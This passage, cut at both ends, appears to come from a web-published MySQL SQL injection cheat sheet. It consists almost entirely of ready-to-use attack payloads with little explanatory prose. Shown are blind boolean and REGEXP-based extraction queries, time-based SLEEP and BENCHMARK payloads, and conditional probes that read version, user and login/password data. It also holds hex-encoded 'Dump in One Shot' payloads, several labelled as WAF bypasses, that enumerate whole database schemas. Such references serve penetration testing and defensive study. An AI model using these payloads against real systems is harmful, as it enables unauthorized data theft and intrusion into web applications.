class="number">1</span>)<span class="operator">=</span><span class="number">5</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">left</span>(version(),<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(substr(Version(),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">51</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> mid(version(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span>)</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.tables <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(column_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.columns <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-Blind-SQL-Injection-in-ORDER-BY-clause-using-a-binary-query-and-REGEXP"><a href="#MySQL-Blind-SQL-Injection-in-ORDER-BY-clause-using-a-binary-query-and-REGEXP" class="headerlink" title="MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP"></a>MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP</h3><p>This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not. For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[...] <span class="keyword">ORDER</span> <span class="keyword">BY</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> [<span class="keyword">COLUMN</span>] <span class="keyword">FROM</span> [<span class="keyword">TABLE</span>] <span class="keyword">WHERE</span> [<span class="keyword">COLUMN</span>] REGEXP &quot;^[BRUTEFORCE CHAR BY CHAR].*&quot; <span class="keyword">AND</span> [FURTHER OPTIONS <span class="operator">/</span> CONDITIONS]) <span class="keyword">THEN</span> [<span class="keyword">ONE</span> <span class="keyword">COLUMN</span> <span class="keyword">TO</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span>] <span class="keyword">ELSE</span> [ANOTHER <span class="keyword">COLUMN</span> <span class="keyword">TO</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span>] <span class="keyword">END</span>)); <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h3 id="MySQL-Blind-SQL-Injection-binary-query-using-REGEXP"><a href="#MySQL-Blind-SQL-Injection-binary-query-using-REGEXP" class="headerlink" title="MySQL Blind SQL Injection binary query using REGEXP."></a>MySQL Blind SQL Injection binary query using REGEXP.</h3><p><strong>Payload:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- -</span></span><br></pre></td></tr></table></figure>
<p>Would work in the query (where the “where” clause is the injection point):</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name,price <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> name <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> name REGEXP &quot;^a.*&quot;) <span class="keyword">THEN</span> SLEEP(<span class="number">3</span>) <span class="keyword">ELSE</span> <span class="number">1</span> <span class="keyword">END</span>)); <span class="comment">-- -&#x27;;</span></span><br></pre></td></tr></table></figure>
<p>In said query, it will check to see if an item exists in the “name” column in the “items” database that starts with an “a”. If it will sleep for 3 seconds per item.</p>
<h3 id="MYSQL-Blind-using-a-conditional-statement"><a href="#MYSQL-Blind-using-a-conditional-statement" class="headerlink" title="MYSQL Blind using a conditional statement"></a>MYSQL Blind using a conditional statement</h3><p>TRUE: if @@version starts with a 5:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2100935</span><span class="string">&#x27; OR IF(MID(@@version,1,1)=&#x27;</span><span class="number">5</span><span class="string">&#x27;,sleep(1),1)=&#x27;</span><span class="number">2</span></span><br><span class="line">Response:</span><br><span class="line">HTTP<span class="operator">/</span><span class="number">1.1</span> <span class="number">500</span> Internal Server Error</span><br></pre></td></tr></table></figure>
<p>False: if @@version starts with a 4:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2100935</span><span class="string">&#x27; OR IF(MID(@@version,1,1)=&#x27;</span><span class="number">4</span><span class="string">&#x27;,sleep(1),1)=&#x27;</span><span class="number">2</span></span><br><span class="line">Response:</span><br><span class="line">HTTP<span class="operator">/</span><span class="number">1.1</span> <span class="number">200</span> OK</span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Blind-with-MAKE-SET"><a href="#MYSQL-Blind-with-MAKE-SET" class="headerlink" title="MYSQL Blind with MAKE_SET"></a>MYSQL Blind with MAKE_SET</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>(<span class="keyword">SELECT</span>(length(version()))),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>ascii(<span class="built_in">substring</span>(version(),POS,<span class="number">1</span>)),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>(<span class="keyword">SELECT</span>(length(concat(login,password)))),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>ascii(<span class="built_in">substring</span>(concat(login,password),POS,<span class="number">1</span>)),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Blind-with-LIKE"><a href="#MYSQL-Blind-with-LIKE" class="headerlink" title="MYSQL Blind with LIKE"></a>MYSQL Blind with LIKE</h3><p>‘_’ acts like the regex character ‘.’, use it to speed up your blind testing</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_code <span class="keyword">FROM</span> customer <span class="keyword">WHERE</span> cust_name <span class="keyword">LIKE</span> <span class="string">&#x27;k__l&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Time-Based"><a href="#MYSQL-Time-Based" class="headerlink" title="MYSQL Time Based"></a>MYSQL Time Based</h2><p>The following SQL codes will delay the output from MySQL.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span>BENCHMARK(<span class="number">40000000</span>,SHA1(<span class="number">1337</span>))<span class="operator">+</span></span><br><span class="line"><span class="string">&#x27;%2Bbenchmark(3200,SHA1(1))%2B&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> [RANDNUM]<span class="operator">=</span>BENCHMARK([SLEEPTIME]<span class="number">000000</span>,MD5(<span class="string">&#x27;[RANDSTR]&#x27;</span>))  <span class="operator">/</span><span class="operator">/</span>SHA1</span><br><span class="line">RLIKE SLEEP([SLEEPTIME])</span><br><span class="line"><span class="keyword">OR</span> ELT([RANDNUM]<span class="operator">=</span>[RANDNUM],SLEEP([SLEEPTIME]))</span><br></pre></td></tr></table></figure>
<h3 id="Using-SLEEP-in-a-subselect"><a href="#Using-SLEEP-in-a-subselect" class="headerlink" title="Using SLEEP in a subselect"></a>Using SLEEP in a subselect</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;%&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;___&#x27;</span>)# </span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;_____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;a____&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;s____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;sa___&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;sw___&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swa__&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swb__&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swi__&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> column_name <span class="keyword">like</span> <span class="string">&#x27;%pass%&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">like</span> <span class="string">&#x27;%&#x27;</span>)#</span><br></pre></td></tr></table></figure>

<h3 id="Using-conditional-statements"><a href="#Using-conditional-statements" class="headerlink" title="Using conditional statements"></a>Using conditional statements</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> <span class="keyword">USER</span>()),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;=</span><span class="number">100</span>,<span class="number">1</span>, BENCHMARK(<span class="number">2000000</span>,MD5(NOW()))) <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> <span class="keyword">USER</span>()), <span class="number">1</span>, <span class="number">1</span>)))<span class="operator">&gt;=</span><span class="number">100</span>, <span class="number">1</span>, SLEEP(<span class="number">3</span>)) <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">OR</span> IF(MID(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span>,sleep(<span class="number">1</span>),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;2</span></span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-DIOS-Dump-in-One-Shot"><a href="#MYSQL-DIOS-Dump-in-One-Shot" class="headerlink" title="MYSQL DIOS - Dump in One Shot"></a>MYSQL DIOS - Dump in One Shot</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> (@) <span class="keyword">from</span> (<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span> (@) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> (table_schema<span class="operator">&gt;=</span>@) <span class="keyword">and</span> (@)<span class="keyword">in</span> (@:<span class="operator">=</span>concat(@,<span class="number">0x0D</span>,<span class="number">0x0A</span>,<span class="string">&#x27; [ &#x27;</span>,table_schema,<span class="string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="string">&#x27; &gt; &#x27;</span>,column_name,<span class="number">0x7C</span>))))a)#</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> (@) <span class="keyword">from</span> (<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span> (@) <span class="keyword">from</span> (db_data.table_data) <span class="keyword">where</span> (@)<span class="keyword">in</span> (@:<span class="operator">=</span>concat(@,<span class="number">0x0D</span>,<span class="number">0x0A</span>,<span class="number">0x7C</span>,<span class="string">&#x27; [ &#x27;</span>,column_data1,<span class="string">&#x27; ] &gt; &#x27;</span>,column_data2,<span class="string">&#x27; &gt; &#x27;</span>,<span class="number">0x7C</span>))))a)#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- SecurityIdiots</span></span><br><span class="line">make_set(<span class="number">6</span>,@:<span class="operator">=</span><span class="number">0x0a</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>make_set(<span class="number">511</span>,@,<span class="number">0x3c6c693e</span>,table_name,column_name)),@)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Profexer</span></span><br><span class="line">(<span class="keyword">select</span>(@)<span class="keyword">from</span>(<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(@)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3C62723E</span>,table_name,<span class="number">0x3a</span>,column_name))))a)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Dr.Z3r0</span></span><br><span class="line">(<span class="keyword">select</span>(<span class="keyword">select</span> concat(@:<span class="operator">=</span><span class="number">0xa7</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3c6c693e</span>,table_name,<span class="number">0x3a</span>,column_name))),@))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- M@dBl00d</span></span><br><span class="line">(<span class="keyword">Select</span> export_set(<span class="number">5</span>,@:<span class="operator">=</span><span class="number">0</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>export_set(<span class="number">5</span>,export_set(<span class="number">5</span>,@,table_name,<span class="number">0x3c6c693e</span>,<span class="number">2</span>),column_name,<span class="number">0xa3a</span>,<span class="number">2</span>)),@,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Zen</span></span><br><span class="line"><span class="operator">+</span>make_set(<span class="number">6</span>,@:<span class="operator">=</span><span class="number">0x0a</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>make_set(<span class="number">511</span>,@,<span class="number">0x3c6c693e</span>,table_name,column_name)),@)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Zen WAF</span></span><br><span class="line">(<span class="comment">/*!12345sELecT*/</span>(@)<span class="keyword">from</span>(<span class="comment">/*!12345sELecT*/</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!12345sELecT*/</span>(@)<span class="keyword">from</span>(`InFoRMAtiON_sCHeMa`.`ColUMNs`)<span class="keyword">where</span>(`TAblE_sCHemA`<span class="operator">=</span>DatAbAsE<span class="comment">/*data*/</span>())<span class="keyword">and</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>CoNCat<span class="operator">%</span><span class="number">0</span>a(@,<span class="number">0x3c62723e5461626c6520466f756e64203a20</span>,TaBLe_nAMe,<span class="number">0x3a3a</span>,column_name))))a)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ~tr0jAn WAF</span></span><br><span class="line"><span class="operator">+</span>concat<span class="comment">/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/</span>(<span class="variable">@x</span>)<span class="comment">/*!from*/</span>(<span class="comment">/*!12345selEcT*/</span>(<span class="variable">@x</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="variable">@r</span>:<span class="operator">=</span><span class="number">0</span>),(<span class="variable">@running</span>_number:<span class="operator">=</span><span class="number">0</span>),(<span class="variable">@tbl</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!12345selEcT*/</span>(<span class="number">0</span>) <span class="keyword">from</span>(information_schema.<span class="comment">/**/</span>columns)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database()) <span class="keyword">and</span>(<span class="number">0x00</span>)<span class="keyword">in</span>(<span class="variable">@x</span>:<span class="operator">=</span>Concat<span class="comment">/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/</span><span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ~tr0jAn Benchmark</span></span><br><span class="line"><span class="operator">+</span>concat(<span class="number">0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20</span>,version(),<span class="number">0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x3c2f666f6e743e3c2f666f6e743e</span>,<span class="number">0x202d2d203a2d20</span>,concat(<span class="variable">@sc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@scc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@r</span>:<span class="operator">=</span><span class="number">0</span>,benchmark(<span class="variable">@a</span>:<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata),<span class="variable">@scc</span>:<span class="operator">=</span>concat(<span class="variable">@scc</span>,<span class="number">0x3c62723e3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d7265643e</span>,LPAD(<span class="variable">@r</span>:<span class="operator">=</span><span class="variable">@r</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">Select</span> concat(<span class="number">0x3c623e</span>,<span class="variable">@sc</span>:<span class="operator">=</span>schema_name,<span class="number">0x3c2f623e</span>) <span class="keyword">from</span> information_schema.schemata <span class="keyword">where</span> schema_name<span class="operator">&gt;</span><span class="variable">@sc</span> <span class="keyword">order</span> <span class="keyword">by</span> schema_name limit <span class="number">1</span>),<span class="number">0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span>),<span class="number">0x29</span>,<span class="number">0x3c2f666f6e743e</span>,<span class="number">0x202e2e2e20</span> ,<span class="variable">@t</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@tt</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@tr</span>:<span class="operator">=</span><span class="number">0</span>,benchmark((<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span>),<span class="variable">@tt</span>:<span class="operator">=</span>concat(<span class="variable">@tt</span>,<span class="number">0x3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d677265656e3e</span>,LPAD(<span class="variable">@tr</span>:<span class="operator">=</span><span class="variable">@tr</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">select</span> concat(<span class="number">0x3c623e</span>,<span class="variable">@t</span>:<span class="operator">=</span>table_name,<span class="number">0x3c2f623e</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">&gt;</span><span class="variable">@t</span> <span class="keyword">order</span> <span class="keyword">by</span> table_name limit <span class="number">1</span>),<span class="number">0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="variable">@t</span>),<span class="number">0x29</span>,<span class="number">0x3c2f666f6e743e</span>,<span class="number">0x202d2d3a20</span>,<span class="variable">@c</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@cc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@cr</span>:<span class="operator">=</span><span class="number">0</span>,benchmark((<span class="keyword">Select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="variable">@t</span>),<span class="variable">@cc</span>:<span class="operator">=</span>concat(<span class="variable">@cc</span>,<span class="number">0x3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d707572706c653e</span>,LPAD(<span class="variable">@cr</span>:<span class="operator">=</span><span class="variable">@cr</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">Select</span> (<span class="variable">@c</span>:<span class="operator">=</span>column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="variable">@t</span> <span class="keyword">and</span> column_name<span class="operator">&gt;</span><span class="variable">@c</span> <span class="keyword">order</span> <span class="keyword">by</span> column_name LIMIT <span class="number">1</span>),<span class="number">0x3c2f666f6e743e</span>)),<span class="variable">@cc</span>,<span class="number">0x3c62723e</span>)),<span class="variable">@tt</span>)),<span class="variable">@scc</span>),<span class="number">0x3c62723e3c62723e</span>,<span class="number">0x3c62723e3c62723e</span>)<span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- N1Z4M WAF</span></span><br><span class="line"><span class="operator">+</span><span class="comment">/*!13337concat*/</span>(<span class="number">0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e</span>,database<span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e</span>,<span class="keyword">user</span><span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e</span>,@<span class="variable">@port</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>_compile_os,<span class="number">0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e</span>,@<span class="variable">@datadir</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e</span>,UUID<span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e</span>,<span class="built_in">current_user</span><span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e</span>,@<span class="variable">@tmpdir</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>_compile_machine,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e</span>,@<span class="variable">@CHARACTER</span>_SET_FILESYSTEM,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e</span>,@<span class="variable">@hostname</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e</span>,UUID<span class="comment">/**N1Z4M**/</span>(),<span 